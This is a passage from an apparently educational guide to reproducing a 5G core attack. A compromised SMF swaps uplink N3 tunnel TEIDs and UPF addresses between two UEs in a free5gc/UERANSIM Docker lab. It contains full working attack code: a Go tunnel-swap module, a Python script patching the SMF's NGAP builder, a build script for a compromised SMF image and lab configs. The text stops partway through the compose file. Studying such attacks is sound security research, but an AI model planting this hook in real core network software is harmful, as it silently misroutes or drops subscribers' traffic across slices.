# Compromised SMF: Uplink N3 Tunnel Swap Attack -- Educational Guide

> A complete, self-contained guide to understanding, reproducing, troubleshooting, and verifying a cross-slice uplink tunnel swap attack on a 5G core network using free5gc and UERANSIM.

---

## Table of Contents

1. [Introduction and 5G Background](#1-introduction-and-5g-background)
2. [Attack Theory](#2-attack-theory)
3. [Lab Architecture](#3-lab-architecture)
4. [Prerequisites](#4-prerequisites)
5. [Step-by-Step Setup](#5-step-by-step-setup)
6. [Building the Compromised SMF Image](#6-building-the-compromised-smf-image)
7. [Running the Attack](#7-running-the-attack)
8. [Verifying the Attack -- Real Proof](#8-verifying-the-attack----real-proof)
9. [Troubleshooting Guide](#9-troubleshooting-guide)
10. [How the Attack Code Works (Deep Dive)](#10-how-the-attack-code-works-deep-dive)
11. [Why UE2 Is Unaware](#11-why-ue2-is-unaware)
12. [Security Implications and Mitigations](#12-security-implications-and-mitigations)
13. [Rollback](#13-rollback)

---

## 1. Introduction and 5G Background

### 1.1 Network Slicing

5G introduces **network slicing** -- the ability to create multiple logical networks (slices) on the same physical infrastructure. Each slice is identified by an **S-NSSAI** (Single Network Slice Selection Assistance Information), consisting of:

- **SST** (Slice/Service Type): An integer identifying the type of service (e.g., 1 = eMBB).
- **SD** (Slice Differentiator): A 3-byte hex string that differentiates slices with the same SST (e.g., `010203`).

A **DNN** (Data Network Name) is similar to an APN in 4G -- it identifies the data network the UE wants to reach (e.g., `internet`).

### 1.2 Role of the SMF

The **Session Management Function (SMF)** manages PDU (Protocol Data Unit) sessions. When a UE requests a data session, the SMF:

1. Selects a **UPF** (User Plane Function) based on the S-NSSAI and DNN.
2. Establishes a **PFCP session** (N4 interface) with the UPF.
3. Receives tunnel allocation from the UPF: a **GTP-U TEID** (Tunnel Endpoint Identifier) and the UPF's N3 IP address.
4. Sends this tunnel information to the **AMF** (via N11), which forwards it to the **gNB** (via N2/NGAP), so the gNB knows where to send the UE's uplink user-plane traffic.

The critical point: **the SMF decides which UPF the gNB will send uplink traffic to**. If the SMF is compromised, it can redirect traffic to any UPF.

### 1.3 N2 and N3 Interfaces

- **N2 (NGAP)**: Control-plane interface between the gNB and AMF. Carries session setup messages including the `PDUSessionResourceSetupRequest`, which contains the tunnel endpoint information.
- **N3 (GTP-U)**: User-plane interface between the gNB and UPF. Carries the actual user data encapsulated in GTP-U tunnels. Port 2152/UDP.

### 1.4 Why a Compromised SMF Is Dangerous

The SMF sits at the intersection of control plane and user plane orchestration. It has the authority to:

- Choose which UPF serves a session
- Specify the GTP-U tunnel endpoint (TEID + IP) sent to the gNB
- Modify session parameters at any time

A compromised SMF can silently redirect any UE's uplink traffic to an attacker-controlled UPF, enabling eavesdropping, traffic manipulation, or denial of service -- all without the UE, gNB, or AMF detecting anything abnormal.

---

## 2. Attack Theory

### 2.1 The Target IE

During PDU session establishment, the SMF builds a `PDUSessionResourceSetupRequestTransfer` NGAP message. Inside this message is the **UL NG-U UP TNL Information** IE (Information Element), which contains:

- **TransportLayerAddress**: The UPF's N3 IP address (where the gNB should send uplink GTP-U packets).
- **GTP-TEID**: The tunnel endpoint identifier allocated by the UPF.

The gNB blindly trusts these values. It has no way to verify whether the TEID/IP actually belong to the correct UPF for that UE's slice.

### 2.2 The Swap

The attack works as follows:

1. **UE1** establishes a PDU session. The SMF records UE1's legitimate tunnel info: `TEID=0x00000002, UPF_IP=10.100.200.101 (UPF1)`.
2. **UE2** establishes a PDU session. The SMF should send `TEID=0x00000006, UPF_IP=10.100.200.102 (UPF2)`. Instead, the compromised SMF **swaps** -- it sends UE1's tunnel info to the gNB for UE2's session.
3. The gNB now sends **UE2's uplink traffic to UPF1** instead of UPF2.

### 2.3 Normal vs. Attack Flow

**Normal flow:**

```
UE1 --[radio]--> gNB --[GTP-U, TEID=0x02]--> UPF1 (10.100.200.101)  [CORRECT]
UE2 --[radio]--> gNB --[GTP-U, TEID=0x06]--> UPF2 (10.100.200.102)  [CORRECT]
```

**Attack flow (after swap):**

```
UE1 --[radio]--> gNB --[GTP-U, TEID=0x02]--> UPF1 (10.100.200.101)  [CORRECT - passed through]
UE2 --[radio]--> gNB --[GTP-U, TEID=0x02]--> UPF1 (10.100.200.101)  [WRONG - swapped!]
```

UE2's traffic arrives at UPF1 with TEID=0x02 (UE1's tunnel). UPF1 does not have a PFCP session for UE2, so:
- UPF1 drops the packets (no matching session for that TEID from UE2's inner IP).
- UE2 experiences 100% packet loss.
- UPF2 receives zero uplink traffic from UE2.

### 2.4 Why the UE Cannot Detect This

The tunnel swap happens on the **N2 interface** (SMF -> AMF -> gNB). The UE only interacts via **NAS** (Non-Access Stratum) messages and sees a successful PDU session establishment. The UE has no visibility into which UPF IP/TEID the gNB was told to use. From UE2's perspective, the session is "up" -- it just experiences packet loss that looks like a network issue.

---

## 3. Lab Architecture

### 3.1 Network Topology

```
                        +-----------+
                        |  MongoDB  |
                        +-----------+
                              |
              +------+   +------+   +------+   +------+
              | NRF  |   | UDR  |   | UDM  |   | AUSF |
              +------+   +------+   +------+   +------+
                              |
    +------+   +------+   +------+   +------+   +------+
    | NSSF |   | PCF  |   | CHF  |   | AMF  |   |WebUI |
    +------+   +------+   +------+   +------+   +------+
                                        |
                                  +-----------+
                                  | COMPROMISED|
                                  |    SMF     |
                                  +-----------+
                                   /         \
                            +------+       +------+
                            | UPF1 |       | UPF2 |
                            +------+       +------+
                               \             /
                                \           /
                              +-----------+
                              |    gNB    |
                              +-----------+
                               /         \
                          +------+   +------+
                          | UE1  |   | UE2  |
                          +------+   +------+
```

### 3.2 IP Addressing Table

| Container        | IP Address       | Role                                   |
|------------------|------------------|----------------------------------------|
| mongodb          | (DHCP)           | Database                               |
| nrf              | (DHCP)           | Network Repository Function            |
| amf              | 10.100.200.16    | Access and Mobility Management         |
| smf (compromised)| (DHCP)           | Session Management (ATTACK)            |
| udm              | (DHCP)           | Unified Data Management                |
| udr              | (DHCP)           | Unified Data Repository                |
| ausf             | (DHCP)           | Authentication Server Function         |
| nssf             | (DHCP)           | Network Slice Selection Function       |
| pcf              | (DHCP)           | Policy Control Function                |
| chf              | (DHCP)           | Charging Function                      |
| webui            | (DHCP)           | Management WebUI (port 5050 on host)   |
| upf1             | 10.100.200.101   | User Plane Function 1 (slice 010203)   |
| upf2             | 10.100.200.102   | User Plane Function 2 (slice 112233)   |
| ueransim-gnb     | 10.100.200.12    | Simulated gNodeB                       |
| ueransim-ue1     | (DHCP)           | Simulated UE 1                         |
| ueransim-ue2     | (DHCP)           | Simulated UE 2                         |

All containers are on a Docker bridge network `privnet` with subnet `10.100.200.0/24`.

### 3.3 S-NSSAI to UPF Mapping

| S-NSSAI (SST/SD) | UPF   | UE IP Pool      | Expected User    |
|-------------------|-------|-----------------|------------------|
| 1 / 010203        | UPF1  | 10.60.0.0/16    | UE1              |
| 1 / 112233        | UPF2  | 10.61.0.0/16    | UE2              |

---

## 4. Prerequisites

### 4.1 Software Requirements

| Software         | Version    | Purpose                              |
|------------------|------------|--------------------------------------|
| Docker Engine    | 20.10+     | Containerization                     |
| Docker Compose   | v2+        | Multi-container orchestration        |
| gtp5g kernel mod | latest     | GTP-U kernel module for UPF          |
| Git              | any        | Clone repositories                   |
| Python3          | 3.6+       | Patch scripts, JSON parsing          |
| Go               | 1.25+      | Build compromised SMF                |
| curl             | any        | WebUI API interaction                |

### 4.2 Host Requirements

- Linux host (tested on Ubuntu with kernel 5.15+)
- ~4 GB RAM minimum
- The `gtp5g` kernel module must be loaded:

```bash
git clone https://github.com/free5gc/gtp5g.git
cd gtp5g && make && sudo make install
sudo modprobe gtp5g
```

### 4.3 Repository Structure

```
free5gc-compose/
├── config/                  # Stock free5gc NF configs (AMF, NRF, etc.)
├── cert/                    # TLS certificates
├── docker-compose.yaml      # Original compose file
└── attack_poc/              # <-- ALL attack files go here
    ├── config/              # Attack-specific configs
    │   ├── smfcfg-attack.yaml
    │   ├── upf1cfg.yaml
    │   ├── upf2cfg.yaml
    │   ├── gnbcfg.yaml
    │   ├── ue1cfg.yaml
    │   ├── ue2cfg.yaml
    │   └── uerouting-attack.yaml
    ├── smf-build/           # Compromised SMF source
    │   └── smf/internal/context/
    │       ├── tunnel_swap.go
    │       └── ngap_build.go (patched)
    ├── captures/            # Pcap output directory
    ├── build_compromised_smf.sh
    ├── docker-compose-attack.yaml
    ├── provision_subscribers.sh
    └── run_attack_from_scratch.sh
```

---

## 5. Step-by-Step Setup

### 5a. Clone the free5gc-compose Repository

```bash
git clone https://github.com/free5gc/free5gc-compose.git
cd free5gc-compose
```

Pull the stock images:

```bash
docker compose pull
```

### 5b. Create the attack_poc Directory Structure

```bash
mkdir -p attack_poc/config attack_poc/captures attack_poc/smf-build
```

### 5c. Configuration Files

Create each file below in `attack_poc/config/`.

#### smfcfg-attack.yaml

This is the SMF configuration with two UPF nodes. The key section is `userplaneInformation` which maps each S-NSSAI to a specific UPF.

```yaml
info:
  version: 1.0.7
  description: SMF config for Compromised SMF Attack PoC (2 UPFs)

configuration:
  smfName: SMF
  sbi:
    scheme: http
    registerIPv4: smf.free5gc.org
    bindingIPv4: smf.free5gc.org
    port: 8000
    tls:
      key: cert/smf.key
      pem: cert/smf.pem
  serviceNameList:
    - nsmf-pdusession
    - nsmf-event-exposure
    - nsmf-oam
  snssaiInfos:
    # S-NSSAI 1 → routed to UPF1
    - sNssai:
        sst: 1
        sd: 010203
      dnnInfos:
        - dnn: internet
          dns:
            ipv4: 8.8.8.8
            ipv6: 2001:4860:4860::8888
    # S-NSSAI 2 → routed to UPF2
    - sNssai:
        sst: 1
        sd: 112233
      dnnInfos:
        - dnn: internet
          dns:
            ipv4: 8.8.8.8
            ipv6: 2001:4860:4860::8888
  plmnList:
    - mcc: 208
      mnc: 93
  locality: area1
  pfcp:
    nodeID: smf.free5gc.org
    listenAddr: smf.free5gc.org
    externalAddr: smf.free5gc.org
  userplaneInformation:
    upNodes:
      gNB1:
        type: AN
      UPF1:
        type: UPF
        nodeID: upf1.free5gc.org
        addr: upf1.free5gc.org
        sNssaiUpfInfos:
          - sNssai:
              sst: 1
              sd: 010203
            dnnUpfInfoList:
              - dnn: internet
                pools:
                  - cidr: 10.60.0.0/16
                staticPools:
                  - cidr: 10.60.100.0/24
        interfaces:
          - interfaceType: N3
            endpoints:
              - upf1.free5gc.org
            networkInstances:
              - internet
      UPF2:
        type: UPF
        nodeID: upf2.free5gc.org
        addr: upf2.free5gc.org
        sNssaiUpfInfos:
          - sNssai:
              sst: 1
              sd: 112233
            dnnUpfInfoList:
              - dnn: internet
                pools:
                  - cidr: 10.61.0.0/16
                staticPools:
                  - cidr: 10.61.100.0/24
        interfaces:
          - interfaceType: N3
            endpoints:
              - upf2.free5gc.org
            networkInstances:
              - internet
    links:
      - A: gNB1
        B: UPF1
      - A: gNB1
        B: UPF2
  t3591:
    enable: true
    expireTime: 16s
    maxRetryTimes: 3
  t3592:
    enable: true
    expireTime: 16s
    maxRetryTimes: 3
  nrfUri: http://nrf.free5gc.org:8000
  nrfCertPem: cert/nrf.pem
  urrPeriod: 10
  urrThreshold: 1000
  requestedUnit: 1000

logger:
  enable: true
  level: debug
  reportCaller: false
```

#### upf1cfg.yaml

```yaml
version: 1.0.3
description: UPF1 configuration (S-NSSAI 1 — SD 010203)

pfcp:
  addr: upf1.free5gc.org
  nodeID: upf1.free5gc.org
  retransTimeout: 1s
  maxRetrans: 3

gtpu:
  forwarder: gtp5g
  ifList:
    - addr: upf1.free5gc.org
      type: N3

dnnList:
  - dnn: internet
    cidr: 10.60.0.0/16

logger:
  enable: true
  level: info
  reportCaller: false
```

#### upf2cfg.yaml

```yaml
version: 1.0.3
description: UPF2 configuration (S-NSSAI 2 — SD 112233)

pfcp:
  addr: upf2.free5gc.org
  nodeID: upf2.free5gc.org
  retransTimeout: 1s
  maxRetrans: 3

gtpu:
  forwarder: gtp5g
  ifList:
    - addr: upf2.free5gc.org
      type: N3

dnnList:
  - dnn: internet
    cidr: 10.61.0.0/16

logger:
  enable: true
  level: info
  reportCaller: false
```

#### gnbcfg.yaml

`linkIp: 0.0.0.0` is critical -- it allows UE containers on other IPs to reach the gNB for radio simulation.

```yaml
mcc: "208"
mnc: "93"

nci: "0x000000010"
idLength: 32
tac: 1

linkIp: 0.0.0.0
ngapIp: gnb.free5gc.org
gtpIp: gnb.free5gc.org

amfConfigs:
  - address: amf.free5gc.org
    port: 38412

slices:
  - sst: 0x1
    sd: 0x010203
  - sst: 0x1
    sd: 0x112233

ignoreStreamIds: true
```

#### ue1cfg.yaml

UE1 uses S-NSSAI SST=1, SD=010203 (maps to UPF1).

```yaml
supi: "imsi-208930000000001"
mcc: "208"
mnc: "93"

key: "8baf473f2f8fd09487cccbd7097c6862"
op: "8e27b6af0e692e750f32667a3b14605d"
opType: "OPC"
amf: "8000"
imei: "356938035643803"
imeiSv: "4370816125816151"

protectionScheme: 0
homeNetworkPublicKeyId: 1
homeNetworkPublicKey: "5a8d38864820197c3394b92613b20b91633cbd897119273bf8e4a6f4eec0a650"

gnbSearchList:
  - gnb.free5gc.org

uacAic:
  mps: false
  mcs: false

uacAcc:
  normalClass: 0
  class11: false
  class12: false
  class13: false
  class14: false
  class15: false

sessions:
  - type: "IPv4"
    apn: "internet"
    slice:
      sst: 0x01
      sd: 0x010203

configured-nssai:
  - sst: 0x01
    sd: 0x010203

default-nssai:
  - sst: 1
    sd: 0x010203

integrity:
  IA1: true
  IA2: true
  IA3: true

ciphering:
  EA1: true
  EA2: true
  EA3: true

integrityMaxRate:
  uplink: "full"
  downlink: "full"
```

#### ue2cfg.yaml

UE2 uses S-NSSAI SST=1, SD=112233 (maps to UPF2).

```yaml
supi: "imsi-208930000000002"
mcc: "208"
mnc: "93"

key: "8baf473f2f8fd09487cccbd7097c6862"
op: "8e27b6af0e692e750f32667a3b14605d"
opType: "OPC"
amf: "8000"
imei: "356938035643804"
imeiSv: "4370816125816152"

protectionScheme: 0
homeNetworkPublicKeyId: 1
homeNetworkPublicKey: "5a8d38864820197c3394b92613b20b91633cbd897119273bf8e4a6f4eec0a650"

gnbSearchList:
  - gnb.free5gc.org

uacAic:
  mps: false
  mcs: false

uacAcc:
  normalClass: 0
  class11: false
  class12: false
  class13: false
  class14: false
  class15: false

sessions:
  - type: "IPv4"
    apn: "internet"
    slice:
      sst: 0x01
      sd: 0x112233

configured-nssai:
  - sst: 0x01
    sd: 0x112233

default-nssai:
  - sst: 1
    sd: 0x112233

integrity:
  IA1: true
  IA2: true
  IA3: true

ciphering:
  EA1: true
  EA2: true
  EA3: true

integrityMaxRate:
  uplink: "full"
  downlink: "full"
```

#### uerouting-attack.yaml

```yaml
info:
  version: 1.0.7
  description: Routing information for UE (Attack PoC — no ULCL)

ueRoutingInfo: # empty — no specific UE routing needed for this PoC
```

### 5d. Attack Go Code -- tunnel_swap.go

This is the core attack module. Place it at `attack_poc/smf-build/smf/internal/context/tunnel_swap.go` (the build script copies it automatically).

```go
// tunnel_swap.go — Compromised SMF: UL N3 Tunnel Info Swap Attack
//
// This file is placed at: smf/internal/context/tunnel_swap.go
//
// Attack Logic:
// 1. When the first PDU session is established, the SMF records the UPF's
//    N3 tunnel info (TEID + IP) that would normally be sent to the RAN.
// 2. When the second PDU session is established, the SMF swaps the tunnel
//    info: session 1 gets session 2's UPF tunnel info and vice versa.
// 3. As a result, UE1's uplink traffic is routed to UPF2, and UE2's
//    uplink traffic is routed to UPF1.

package context

import (
	"encoding/binary"
	"net"
	"sync"

	"github.com/sirupsen/logrus"
)

// TunnelInfo holds the N3 UL tunnel information for one PDU session
type TunnelInfo struct {
	TEID   uint32 // GTP-U TEID allocated by the UPF
	UPF_IP net.IP // The UPF's N3 IP address
	SUPI   string // Subscriber ID (for logging)
}

// TunnelSwapAttack holds the state for the two-session swap attack
type TunnelSwapAttack struct {
	mu       sync.Mutex
	enabled  bool
	sessions []*TunnelInfo // Collect up to 2 sessions
	swapped  bool         // True once the swap has been executed
	log      *logrus.Entry
}

// Global singleton for the attack state
var AttackState = &TunnelSwapAttack{
	enabled:  true, // Set to false to disable the attack
	sessions: make([]*TunnelInfo, 0, 2),
	log:      logrus.WithField("module", "TunnelSwapAttack"),
}

// RecordAndSwap is called from BuildPDUSessionResourceSetupRequestTransfer.
// It records the original tunnel info and, once two sessions are seen,
// returns the SWAPPED tunnel info for each session.
//
// Returns: (teid []byte, upfIP net.IP, wasSwapped bool)
func (a *TunnelSwapAttack) RecordAndSwap(
	originalTEID uint32,
	originalUPF_IP net.IP,
	supi string,
) ([]byte, net.IP, bool) {
	a.mu.Lock()
	defer a.mu.Unlock()

	teidBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(teidBytes, originalTEID)

	if !a.enabled {
		a.log.Info("[ATTACK DISABLED] Passing through original tunnel info")
		return teidBytes, originalUPF_IP, false
	}

	info := &TunnelInfo{
		TEID:   originalTEID,
		UPF_IP: make(net.IP, len(originalUPF_IP)),
		SUPI:   supi,
	}
	copy(info.UPF_IP, originalUPF_IP)

	a.log.Infof("[ATTACK] Recording session %d: SUPI=%s, TEID=0x%08x, UPF_IP=%s",
		len(a.sessions)+1, supi, originalTEID, originalUPF_IP)

	if len(a.sessions) == 0 {
		// First session: record and pass through original
		a.sessions = append(a.sessions, info)
		a.log.Warnf("[ATTACK] Session 1 recorded. Waiting for session 2 before swap.")
		a.log.Warnf("[ATTACK] Session 1 ORIGINAL: TEID=0x%08x, UPF_IP=%s (SUPI=%s)",
			originalTEID, originalUPF_IP, supi)
		return teidBytes, originalUPF_IP, false
	}

	if len(a.sessions) == 1 && !a.swapped {
		// Second session: NOW we swap!
		a.sessions = append(a.sessions, info)
		a.swapped = true

		swappedTEID := make([]byte, 4)
		binary.BigEndian.PutUint32(swappedTEID, a.sessions[0].TEID)

		a.log.Warnf("========================================")
		a.log.Warnf("[ATTACK] *** SWAP EXECUTED ***")
		a.log.Warnf("[ATTACK] Session 2 (SUPI=%s) gets Session 1's tunnel:", supi)
		a.log.Warnf("[ATTACK]   TEID=0x%08x → 0x%08x", originalTEID, a.sessions[0].TEID)
		a.log.Warnf("[ATTACK]   UPF_IP=%s → %s", originalUPF_IP, a.sessions[0].UPF_IP)
		a.log.Warnf("[ATTACK] Session 1 (SUPI=%s) was sent ORIGINAL (will be swapped on next N2 build if triggered)", a.sessions[0].SUPI)
		a.log.Warnf("========================================")

		return swappedTEID, a.sessions[0].UPF_IP, true
	}

	// Already swapped — check if this is session 1 coming back for an update
	if a.swapped && len(a.sessions) == 2 {
		for i, s := range a.sessions {
			if s.SUPI == supi {
				other := a.sessions[1-i]
				swappedTEID := make([]byte, 4)
				binary.BigEndian.PutUint32(swappedTEID, other.TEID)
				a.log.Warnf("[ATTACK] Returning swapped info for SUPI=%s: TEID=0x%08x, IP=%s",
					supi, other.TEID, other.UPF_IP)
				return swappedTEID, other.UPF_IP, true
			}
		}
	}

	a.log.Warnf("[ATTACK] Unknown session (SUPI=%s), passing through original", supi)
	return teidBytes, originalUPF_IP, false
}

// Reset clears the attack state (for testing/rollback)
func (a *TunnelSwapAttack) Reset() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.sessions = make([]*TunnelInfo, 0, 2)
	a.swapped = false
	a.log.Info("[ATTACK] State reset")
}

// Disable turns off the attack — all subsequent calls pass through
func (a *TunnelSwapAttack) Disable() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.enabled = false
	a.log.Info("[ATTACK] Disabled")
}

// Enable turns on the attack
func (a *TunnelSwapAttack) Enable() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.enabled = true
	a.log.Info("[ATTACK] Enabled")
}
```

### 5e. The ngap_build.go Patch

The build script patches `smf/internal/context/ngap_build.go` automatically. Here is the exact change in the `BuildPDUSessionResourceSetupRequestTransfer` function. The original code extracts the N3 IP and TEID from the UPF node. The patch intercepts those values and passes them through `AttackState.RecordAndSwap()`:

**Original code:**

```go
// UL NG-U UP TNL Information
ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
ie.Criticality.Value = ngapType.CriticalityPresentReject
if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
    return nil, err
} else {
    ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
        Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
        ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
            Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
            GTPTunnel: &ngapType.GTPTunnel{
                TransportLayerAddress: ngapType.TransportLayerAddress{
                    Value: aper.BitString{
                        Bytes:     n3IP,
                        BitLength: uint64(len(n3IP) * 8),
                    },
                },
                GTPTEID: ngapType.GTPTEID{Value: teidOct},
            },
        },
    }
}
```

**Patched code (attack injected):**

```go
// UL NG-U UP TNL Information
// >>> ATTACK: Intercept and potentially swap the UL tunnel info <<<
n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType)
if err != nil {
    return nil, err
}
swappedTEID, swappedIP, wasSwapped := AttackState.RecordAndSwap(
    ctx.LocalULTeid, n3IP, ctx.Supi)
if wasSwapped {
    n3IP = swappedIP
    teidOct = swappedTEID
}
// >>> END ATTACK <<<
ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
ie.Criticality.Value = ngapType.CriticalityPresentReject
ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
    Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
    ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
        Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
        GTPTunnel: &ngapType.GTPTunnel{
            TransportLayerAddress: ngapType.TransportLayerAddress{
                Value: aper.BitString{
                    Bytes:     n3IP,
                    BitLength: uint64(len(n3IP) * 8),
                },
            },
            GTPTEID: ngapType.GTPTEID{Value: teidOct},
        },
    },
}
```

The only change: before the UL NG-U UP TNL Information IE is built, `AttackState.RecordAndSwap()` is called with the original TEID, UPF IP, and SUPI. If the swap was executed (second session), the returned values replace the originals.

### 5f. Build Script -- build_compromised_smf.sh

```bash
#!/bin/bash
# ============================================================================
# build_compromised_smf.sh — Build the Compromised SMF Docker Image
# ============================================================================
#
# This script:
#   1. Clones the free5gc/smf repository (main branch)
#   2. Injects the tunnel swap attack code
#   3. Patches BuildPDUSessionResourceSetupRequestTransfer to use the swap
#   4. Builds a Docker image: free5gc/smf:compromised
#
# Usage:
#   cd free5gc-compose/attack_poc
#   chmod +x build_compromised_smf.sh
#   ./build_compromised_smf.sh
#
# To return to normal:
#   docker-compose -f docker-compose-attack.yaml down
#   docker-compose up -d   # uses original images
# ============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BUILD_DIR="${SCRIPT_DIR}/smf-build"
SMF_IMAGE="free5gc/smf:compromised"

echo "============================================"
echo " Building Compromised SMF Docker Image"
echo "============================================"

# Step 1: Clone SMF source (if not already)
if [ -d "${BUILD_DIR}/smf" ]; then
    echo "[*] SMF source already cloned at ${BUILD_DIR}/smf"
else
    echo "[*] Cloning free5gc/smf (main branch)..."
    mkdir -p "${BUILD_DIR}"
    git clone --depth 1 https://github.com/free5gc/smf.git "${BUILD_DIR}/smf"
fi

SMF_SRC="${BUILD_DIR}/smf"

# Step 2: Copy the tunnel_swap.go attack module into SMF context package
echo "[*] Injecting tunnel_swap.go into smf/internal/context/..."
cp "${SCRIPT_DIR}/tunnel_swap.go" "${SMF_SRC}/internal/context/tunnel_swap.go"

# Step 3: Patch ngap_build.go to hook into the attack
echo "[*] Patching ngap_build.go..."

NGAP_FILE="${SMF_SRC}/internal/context/ngap_build.go"

# Check if already patched
if grep -q "ATTACK" "${NGAP_FILE}"; then
    echo "    Already patched."
else
    # Create the patched version
    cat > "${BUILD_DIR}/ngap_build_patch.py" << 'PYTHON_PATCH'
import re
import sys

filepath = sys.argv[1]
with open(filepath, 'r') as f:
    content = f.read()

old_block = '''	// UL NG-U UP TNL Information
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

new_block = '''	// UL NG-U UP TNL Information
	// >>> ATTACK: Intercept and potentially swap the UL tunnel info <<<
	ie = ngapType.PDUSessionResourceSetupRequestTransferIEs{}
	ie.Id.Value = ngapType.ProtocolIEIDULNGUUPTNLInformation
	ie.Criticality.Value = ngapType.CriticalityPresentReject
	if n3IP, err := UpNode.N3Interfaces[0].IP(ctx.SelectedPDUSessionType); err != nil {
		return nil, err
	} else {
		// ATTACK: Record original and get (possibly swapped) tunnel info
		swappedTEID, swappedIP, wasSwapped := AttackState.RecordAndSwap(
			ctx.LocalULTeid, n3IP, ctx.Supi)
		if wasSwapped {
			n3IP = swappedIP
			teidOct = swappedTEID
		}
		// >>> END ATTACK <<<
		ie.Value = ngapType.PDUSessionResourceSetupRequestTransferIEsValue{
			Present: ngapType.PDUSessionResourceSetupRequestTransferIEsPresentULNGUUPTNLInformation,
			ULNGUUPTNLInformation: &ngapType.UPTransportLayerInformation{
				Present: ngapType.UPTransportLayerInformationPresentGTPTunnel,
				GTPTunnel: &ngapType.GTPTunnel{
					TransportLayerAddress: ngapType.TransportLayerAddress{
						Value: aper.BitString{
							Bytes:     n3IP,
							BitLength: uint64(len(n3IP) * 8),
						},
					},
					GTPTEID: ngapType.GTPTEID{Value: teidOct},
				},
			},
		}
	}'''

if old_block in content:
    content = content.replace(old_block, new_block)
    print("  [OK] Patched UL NG-U UP TNL Information block")
else:
    print("  [WARN] Could not find exact UL NG-U UP TNL block — may already be patched or source differs")
    if 'ATTACK' not in content:
        print("  [ERROR] Patch failed — manual intervention needed")
        sys.exit(1)

with open(filepath, 'w') as f:
    f.write(content)

print("  [OK] ngap_build.go patched successfully")
PYTHON_PATCH

    python3 "${BUILD_DIR}/ngap_build_patch.py" "${NGAP_FILE}"
fi

# Step 4: Create the Dockerfile for building the compromised SMF
echo "[*] Creating Dockerfile..."
cat > "${BUILD_DIR}/Dockerfile.smf-compromised" << 'DOCKERFILE'
# Stage 1: Build the compromised SMF binary (free5gc requires Go 1.25+)
FROM golang:1.25-bookworm AS builder

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get -y install gcc cmake autoconf libtool pkg-config libmnl-dev libyaml-dev && \
    apt-get clean

WORKDIR /go/src/smf
COPY smf/ .

RUN go mod download && \
    CGO_ENABLED=0 go build -o /go/bin/smf ./cmd

# Stage 2: Minimal runtime image (certs provided by volume in compose)
FROM alpine:3.19

LABEL description="Free5GC SMF - Compromised (Tunnel Swap Attack PoC)"

RUN apk add --no-cache bash curl tcpdump

WORKDIR /free5gc
RUN mkdir -p config/ log/ cert/

COPY --from=builder /go/bin/smf ./smf

VOLUME [ "/free5gc/config", "/free5gc/cert" ]
EXPOSE 8000
DOCKERFILE

# Step 5: Build the Docker image
echo "[*] Building Docker image: ${SMF_IMAGE}..."
cd "${BUILD_DIR}"
docker build -t "${SMF_IMAGE}" -f Dockerfile.smf-compromised .

echo ""
echo "============================================"
echo " SUCCESS: ${SMF_IMAGE} built"
echo "============================================"
echo ""
echo "Next steps:"
echo "  cd ${SCRIPT_DIR}/.."
echo "  docker-compose -f attack_poc/docker-compose-attack.yaml up -d"
echo ""
```

### 5g. Docker Compose -- docker-compose-attack.yaml

This file defines the full attack stack: 2 UPFs, compromised SMF, all core NFs, gNB, and 2 UEs.

```yaml
# ============================================================================
# docker-compose-attack.yaml
# Compromised SMF Attack PoC — Uplink N3 Tunnel Swap
#
# Topology:
#   1 AMF, 1 Compromised SMF, 2 UPFs (UPF1, UPF2), 1 gNB, 2 UEs
#
# Usage (run from free5gc-compose repo root with --project-directory .):
#   ./attack_poc/build_compromised_smf.sh
#   docker compose -f attack_poc/docker-compose-attack.yaml --project-directory . up -d
#
#   To return to normal:
#   docker compose -f attack_poc/docker-compose-attack.yaml --project-directory . down
#   docker compose up -d
# ============================================================================

services:
  # ──────────────────────────── UPF 1 ────────────────────────────
  free5gc-upf1:
    container_name: upf1
    image: free5gc/upf:v4.1.0
    command: bash -c "./upf-iptables.sh && ./upf -c ./config/upfcfg.yaml"
    volumes:
      - ./attack_poc/config/upf1cfg.yaml:/free5gc/config/upfcfg.yaml
      - ./config/upf-iptables.sh:/free5gc/upf-iptables.sh
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    devices:
      - /dev/net/tun:/dev/net/tun
    privileged: true
    networks:
      privnet:
        ipv4_address: 10.100.200.101
        aliases:
          - upf1.free5gc.org

  # ──────────────────────────── UPF 2 ────────────────────────────
  free5gc-upf2:
    container_name: upf2
    image: free5gc/upf:v4.1.0
    command: bash -c "./upf-iptables.sh && ./upf -c ./config/upfcfg.yaml"
    volumes:
